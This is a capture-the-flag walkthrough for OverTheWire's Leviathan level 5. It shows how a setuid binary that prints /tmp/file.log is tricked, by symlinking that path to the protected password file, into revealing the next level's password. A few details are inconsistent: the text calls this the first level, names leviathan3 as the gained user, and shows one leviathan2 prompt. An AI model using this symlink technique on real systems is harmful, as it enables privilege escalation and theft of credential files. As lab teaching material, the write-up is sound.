This being the first level, we are given the username and password to connect to the instance via ssh.

To connect, `ssh leviathan5@leviathan.labs.overthewire.org -p 2223`.

On being prompted for password, enter **leviathan5**.

After a successful connection, we are presented with a shell.


We are informed that the `Data for the levels can be found in the homedirectories`.

So lets list the files present in the home directory.

```
leviathan5@leviathan:~$ ls -al
total 28
drwxr-xr-x  2 root       root       4096 Aug 26  2019 .
drwxr-xr-x 10 root       root       4096 Aug 26  2019 ..
-rw-r--r--  1 root       root        220 May 15  2017 .bash_logout
-rw-r--r--  1 root       root       3526 May 15  2017 .bashrc
-r-sr-x---  1 leviathan6 leviathan5 7560 Aug 26  2019 leviathan5
-rw-r--r--  1 root       root        675 May 15  2017 .profile
```

The **leviathan5** file has the setuid bit set and it is executable.


The setuid bit allows the executable to gain the permissions of the owner instead of the user executing it.


In this case, on running the leviathan5 executable, it will gain permissions of leviathan3.


Lets run `leviathan5` and see what happens.

```
leviathan2@leviathan:~$ ./leviathan5 
Cannot find /tmp/file.log
```

We will create `file.log` in `/tmp` and run leviathan5 again.

```
leviathan5@leviathan:~$ touch /tmp/file.log
leviathan5@leviathan:~$ ls -al /tmp/file.log
-rw-r--r-- 1 leviathan5 root 0 Aug 16 10:14 /tmp/file.log
leviathan5@leviathan:~$ ./leviathan5
leviathan5@leviathan:~$
```

There was no output printed to the screen.

Lets check the `/tmp/file.log` to see if any output was logged in it.

```
leviathan5@leviathan:~$ cat /tmp/file.log
cat: /tmp/file.log: No such file or directory
```

Apparently levithan5 deletes `/tmp/file.log` after execution.


Lets create `/tmp/file.log` again and then run ltrace on leviathan5 to see what library functions it is using.


```
leviathan5@leviathan:~$ touch /tmp/file.log
leviathan5@leviathan:~$ ls -al /tmp/file.log
-rw-r--r-- 1 leviathan5 root 0 Aug 16 10:18 /tmp/file.log
leviathan5@leviathan:~$ ltrace ./leviathan5
__libc_start_main(0x80485db, 1, 0xffffd784, 0x80486a0 <unfinished ...>
fopen("/tmp/file.log", "r")                                              = 0x804b008
fgetc(0x804b008)                                                         = '\377'
feof(0x804b008)                                                          = 1
fclose(0x804b008)                                                        = 0
getuid()                                                                 = 12005
setuid(12005)                                                            = 0
unlink("/tmp/file.log")                                                  = 0
+++ exited (status 0) +++
```

We see that leviathan5 opens `/tmp/file.log` and reads it each character.

And after reading each character it checks if the it has reached the end of file (EOF).

On reaching end of file, it closes the file and unlinks it.

Unlinking a file effectively deletes the file. This is why we couldn't find the file after executing leviathan5.


Let us add a few characters to `/tmp/file.log` and run leviathan5 again to see what happens.

```
leviathan5@leviathan:~$ echo 'abc' > /tmp/file.log
leviathan5@leviathan:~$ ls -al /tmp/file.log
-rw-r--r-- 1 leviathan5 root 4 Aug 16 10:27 /tmp/file.log
leviathan5@leviathan:~$ ./leviathan5 
abc
```

We can be sure now that leviathan5 reads and prints each character from `/tmp/file.log` and prints to screen.


To use this to our advantage, we will create a symlink to `/etc/leviathan_pass/levithan6` from `/tmp/file.log`.

```
leviathan5@leviathan:~$ ln -s /etc/leviathan_pass/leviathan6 /tmp/file.log
leviathan5@leviathan:~$ ls -al /tmp/file.log
lrwxrwxrwx 1 leviathan5 root 30 Aug 16 10:31 /tmp/file.log -> /etc/leviathan_pass/leviathan6
leviathan5@leviathan:~$ ./leviathan5
<leviathan6_password>
```

With this we get the password for the next level.